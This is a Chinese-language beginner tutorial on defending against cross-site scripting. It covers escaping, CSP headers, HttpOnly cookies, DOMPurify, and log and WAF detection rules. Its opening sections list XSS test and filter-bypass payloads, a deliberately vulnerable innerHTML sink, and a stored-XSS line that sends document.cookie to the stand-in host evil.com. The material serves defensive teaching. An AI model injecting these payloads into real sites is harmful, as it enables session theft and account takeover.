---
order: 450
title: Cybersecurity XSS 防御
module: 033-cybersecurity
category: '033-cybersecurity'
difficulty: beginner
description: Cybersecurity XSS 防御 的完整教学讲解。
author: fanquanpp
updated: '2026-08-01'
related: []
prerequisites: []
---
## XSS 攻击类型

**基本写法：反射型 XSS**
```html
`<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>`
```
```html
<!-- 反射型 XSS 载荷示例 -->
<script>alert(document.cookie)</script>
```

**基本写法：存储型 XSS**
```html
`<script>document.location='http://evil.com/?c='+document.cookie</script>`
```
```html
<!-- 存储型 XSS 窃取 Cookie -->
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**基本写法：DOM 型 XSS**
```javascript
`document.getElementById('output').innerHTML = location.hash`
```
```javascript
// DOM 型 XSS 漏洞代码
document.getElementById('output').innerHTML = location.hash.slice(1)
```

---

## XSS 测试载荷

**基本写法：常用测试载荷**
```html
`<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>`
```
```html
<!-- 常用 XSS 测试载荷 -->
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
```

**基本写法：编码绕过载荷**
```html
`<script>alert&#40;1&#41;</script>
<script>\u0061lert(1)</script>
<img src=x:alert(alt) onerror=eval(alt) alt=xss>
<svg><script>alert(1)</script></svg>`
```
```html
<!-- 编码绕过 XSS 载荷 -->
<script>alert&#40;1&#41;</script>
```

**基本写法：事件触发载荷**
```html
`<div onmouseover=alert(1)>hover</div>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
<select onfocus=alert(1) autofocus>`
```
```html
<!-- 事件触发的 XSS 载荷 -->
<div onmouseover=alert(1)>hover me</div>
```

---

## HTML 实体编码

**基本写法：Python HTML 转义**
`html.escape(<字符串>)`
```python
# Python 转义 HTML 特殊字符
import html
safe = html.escape('<script>alert(1)</script>')
# 输出: &lt;script&gt;alert(1)&lt;/script&gt;
```

**基本写法：PHP htmlspecialchars**
`htmlspecialchars(<字符串>, ENT_QUOTES, 'UTF-8')`
```php
// PHP 转义 HTML 特殊字符
$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**基本写法：Java HTML 转义**
```java
`import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(input);`
```
```java
// Java 使用 Apache Commons 转义 HTML
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(input);
```

**基本写法：JavaScript 转义**
`String(input).replace(/[&<>"']/g, char => map[char])`
```javascript
// JavaScript 转义 HTML
function escapeHtml(text) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'};
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

---

## CSP 内容安全策略

**基本写法：设置 CSP 头**
`Content-Security-Policy: default-src 'self'`
```http
# 基础 CSP 策略只允许同源资源
Content-Security-Policy: default-src 'self'
```

**基本写法：允许特定来源**
`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com`
```http
# 允许同源和指定 CDN 的脚本
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**基本写法：禁止内联脚本**
`Content-Security-Policy: script-src 'self'`
```http
# 禁止内联 script 标签和事件处理
Content-Security-Policy: script-src 'self'
```

**基本写法：使用 nonce 允许内联**
`Content-Security-Policy: script-src 'nonce-<随机值>'`
```http
# 使用 nonce 允许特定内联脚本
Content-Security-Policy: script-src 'nonce-abc123random456'
```

**基本写法：Nginx 配置 CSP**
```nginx
`add_header Content-Security-Policy "default-src 'self'; script-src 'self'";`
```
```nginx
# Nginx 配置 CSP 头
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'" always;
```

---

## HttpOnly Cookie

**基本写法：设置 HttpOnly Cookie**
`Set-Cookie: <键>=<值>; HttpOnly`
```http
# 设置 HttpOnly 防止 JS 读取 Cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**基本写法：PHP 设置 HttpOnly**
`setcookie(<名称>, <值>, [<选项>])`
```php
// PHP 设置 HttpOnly Cookie
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

**基本写法：Java 设置 HttpOnly**
```java
`Cookie cookie = new Cookie("session", value);
cookie.setHttpOnly(true);
cookie.setSecure(true);
response.addCookie(cookie);`
```
```java
// Java 设置 HttpOnly Cookie
Cookie cookie = new Cookie("session", value);
cookie.setHttpOnly(true);
cookie.setSecure(true);
response.addCookie(cookie);
```

**基本写法：Express 设置 HttpOnly**
```javascript
`res.cookie('session', value, { httpOnly: true, secure: true, sameSite: 'strict' })`
```
```javascript
// Express 设置 HttpOnly Cookie
res.cookie('session', value, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});
```

---

## 安全框架防御

**基本写法：Django 自动转义**
```python
`# Django 模板默认自动转义
{{ user_input }}

# 标记为安全内容
{{ user_input|safe }}`
```
```python
# Django 模板自动转义 HTML
{{ user_input }}
# 标记为安全内容（确认无 XSS 风险）
{{ user_input|safe }}
```

**基本写法：Jinja2 自动转义**
```python
`from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))`
```
```python
# Jinja2 启用自动转义
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string('{{ user_input }}')
```

**基本写法：React 自动转义**
```jsx
`// React 默认转义
<div>{userInput}</div>

// 危险设置 HTML（不推荐）
<div dangerouslySetInnerHTML={{__html: userInput}} />`
```
```jsx
// React JSX 默认转义 HTML
<div>{userInput}</div>
// 危险设置 innerHTML（避免使用）
<div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />
```

---

## 输入验证

**基本写法：白名单验证**
```python
`import re
if re.match(r'^[a-zA-Z0-9_]+$', username):
    # 安全处理`
```
```python
# 只允许字母数字下划线
import re
if re.match(r'^[a-zA-Z0-9_]+$', username):
    # 安全处理
```

**基本写法：长度限制**
```python
`username = username[:50]`
```
```python
# 限制输入长度
username = request.form.get('username', '')[:50]
```

**基本写法：HTML 标签过滤**
```python
`from bleach import clean
cleaned = clean(input, tags=['b', 'i', 'a'], attributes={'a': ['href']})`
```
```python
# 使用 bleach 过滤 HTML
from bleach import clean
cleaned = clean(user_input, tags=['b', 'i', 'a'], attributes={'a': ['href']})
```

---

## DOM 安全

**基本写法：使用 textContent 代替 innerHTML**
```javascript
`element.textContent = userInput`
```
```javascript
// 安全的 DOM 操作使用 textContent
element.textContent = userInput
```

**基本写法：使用 createElement**
```javascript
`const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);`
```
```javascript
// 安全创建 DOM 元素
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);
```

**基本写法：URL 验证**
```javascript
`function isSafeUrl(url) {
  return /^https?:\/\//.test(url) && !/^javascript:/.test(url);
}`
```
```javascript
// 验证 URL 防止 javascript: 协议
function isSafeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'http:' || u.protocol === 'https:';
  } catch {
    return false;
  }
}
```

---

## DOMPurify 消毒

**基本写法：使用 DOMPurify 消毒**
```javascript
`import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);`
```
```javascript
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

**基本写法：Node.js 使用 DOMPurify**
```javascript
`const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(dirty);`
```
```javascript
// Node.js 服务端使用 DOMPurify
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(dirtyHtml);
```

---

## XSS 检测与监控

**基本写法：日志检测 XSS 尝试**
```bash
`grep -iE "<script|onerror=|onload=|javascript:" /var/log/nginx/access.log`
```
```bash
# 检测日志中的 XSS 攻击特征
grep -iE "<script|onerror=|onload=|javascript:|<img.*src.*onerror" /var/log/nginx/access.log
```

**基本写法：统计 XSS 攻击来源**
```bash
`grep -iE "<script|onerror=" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn`
```
```bash
# 统计 XSS 攻击来源 IP
grep -iE "<script|onerror=|onload=" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法：WAF 规则防御 XSS**
```apache
`SecRule ARGS "(?i)(<script|javascript:|onerror=|onload=)" "id:1002,phase:2,deny,status:403"`
```
```apache
# ModSecurity XSS 防御规则
SecRule ARGS "(?i)(<script|javascript:|onerror=|onload=|<img.*src.*onerror)" "id:1002,phase:2,deny,status:403"
```

## 参考文献

OWASP Top 10：https://owasp.org/www-project-top-ten/
OWASP Cheat Sheets：https://cheatsheetseries.owasp.org/
NIST 网络安全框架：https://www.nist.gov/cyberframework
CWE 数据库：https://cwe.mitre.org/
PortSwigger Web Security Academy：https://portswigger.net/web-security

## 延伸阅读

密码学与证书，见 033-cybersecurity 模块文档。
Web 攻击与防御，见 033-cybersecurity 模块相关文档。
网络层安全，见 032-networking 模块。
黑马程序员 Bilibili 空间（https://space.bilibili.com/37974444 ）提供网络安全课程。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| 安全基础与防御 | 001-SecurityBasicsDefense | 本文的前置基础 |
| Web安全与渗透测试 | 002-WebSecurityPenetrationTesting | 本文的安全延伸 |
| 二进制安全与应急响应 | 003-BinarySecurityAndIncidentResponse | 本文的安全延伸 |
| 安全工具与实战 | 004-SecurityToolsPractice | 本文的综合应用 |
| XSS攻击 | 005-XSSAttack | 本文的并列主题 |
| 安全模型与框架 | 006-SecurityModelFramework | 本文的安全延伸 |
| CSRF攻击 | 007-CSRFAttack | 本文的并列主题 |
| 密码学应用 | 008-CryptographyApplication | 本文的并列主题 |
| Web安全深度 | 009-WebSecurityDeep | 本文的安全延伸 |
| 安全运营中心 | 010-SOC | 本文的安全延伸 |
| SSRF攻击 | 011-SSRFAttack | 本文的并列主题 |
| 恶意代码分析 | 012-MalwareAnalysis | 本文的并列主题 |
| 云安全 | 013-CloudSecurity | 本文的安全延伸 |
| 对称加密 | 014-SymmetricEncryption | 本文的安全延伸 |
| 应急响应 | 015-IncidentResponse | 本文的并列主题 |
| 非对称加密 | 016-AsymmetricEncryption | 本文的安全延伸 |
| 哈希算法 | 017-HashAlgorithm | 本文的并列主题 |
| 安全开发 | 018-SecureDevelopment | 本文的安全延伸 |
| 合规与审计 | 019-ComplianceAudit | 本文的并列主题 |
| 数字证书 | 020-DigitalCertificate | 本文的并列主题 |
| HTTPS原理 | 021-HTTPSPrinciple | 本文的原理深化 |
| 渗透测试方法论 | 022-PenetrationTestingMethodology | 本文的并列主题 |
| 信息收集 | 023-InformationGathering | 本文的并列主题 |
| 漏洞扫描 | 024-VulnerabilityScan | 本文的并列主题 |
| 安全编码原则 | 025-SecureCodingPrinciples | 本文的安全延伸 |
| 输入验证 | 026-InputValidation | 本文的并列主题 |
| 认证与授权 | 027-AuthenticationAuthorization | 本文的并列主题 |
| OWASP-Top-10详解 | 028-OWASPTop10Detailed | 本文的并列主题 |
| XXE攻击 | 029-XXEAttack | 本文的并列主题 |
| 反序列化漏洞 | 030-DeserializationVulnerability | 本文的并列主题 |
| 零信任架构 | 031-ZeroTrustArchitecture | 本文的原理深化 |
| 身份与访问管理 | 032-IdentityAccessManagement | 本文的并列主题 |
| 安全基线 | 033-SecurityBaseline | 本文的安全延伸 |
| 漏洞扫描工具 | 034-VulnerabilityScanTools | 本文的并列主题 |
| WAF规则 | 035-WAFRule | 本文的并列主题 |
| Cybersecurity OpenSSL 证书管理 | 036-OpenSSLCert | 本文的并列主题 |
| Cybersecurity OpenSSL 加密解密 | 037-OpenSSLEncrypt | 本文的安全延伸 |
| Cybersecurity nmap 端口扫描 | 038-NmapScan | 本文的并列主题 |
| Cybersecurity 哈希工具 | 039-HashTools | 本文的并列主题 |
| Cybersecurity hashcat 密码破解 | 040-Hashcat | 本文的并列主题 |
| Cybersecurity GPG 加密与签名 | 041-GPGEncrypt | 本文的安全延伸 |
| Cybersecurity SSH 密钥管理 | 042-SSHKeys | 本文的并列主题 |
| Cybersecurity 密码哈希 | 043-PasswordHash | 本文的并列主题 |
| Cybersecurity SQL 注入检测与防御 | 044-SQLInjection | 本文的并列主题 |
| Cybersecurity XSS 防御 | 045-XSSDefense | 本文自身 |
| Cybersecurity CSRF 防御命令与配置 | 046-CSRFDefense | 本文的并列主题 |
| Cybersecurity XXE 防御与检测 | 047-XXEDefense | 本文的并列主题 |
| Cybersecurity 命令注入防御与检测 | 048-CommandInjection | 本文的并列主题 |
| Cybersecurity OAuth2/OIDC 配置命令 | 049-OAuth2OIDC | 本文的并列主题 |
| Cybersecurity 防火墙配置(ufw/firewalld) | 050-FirewallConfig | 本文的并列主题 |
| Cybersecurity IDS/IPS 命令(Suricata/Snort) | 051-IDSIPSCommands | 本文的并列主题 |
| Cybersecurity Metasploit 命令(渗透测试) | 052-MetasploitCommands | 本文的并列主题 |
| Cybersecurity Burp Suite 命令行 | 053-BurpSuiteCLI | 本文的并列主题 |
| Cybersecurity Nikto Web 扫描 | 054-NiktoScan | 本文的并列主题 |
| Cybersecurity OpenVAS 漏洞扫描 | 055-OpenVASCommands | 本文的并列主题 |
| Cybersecurity SELinux/AppArmor 强制访问控制 | 056-SELinuxAppArmor | 本文的并列主题 |
| Cybersecurity AIDE 文件完整性检查 | 057-AIDEFileIntegrity | 本文的并列主题 |
| Cybersecurity auditd 审计命令 | 058-AuditdCommands | 本文的并列主题 |
| Cybersecurity 隐写术工具命令 | 059-SteganographyTools | 本文的并列主题 |
| Cybersecurity 逆向工程命令(radare2/ghidra CLI) | 060-ReverseEngineering | 本文的并列主题 |
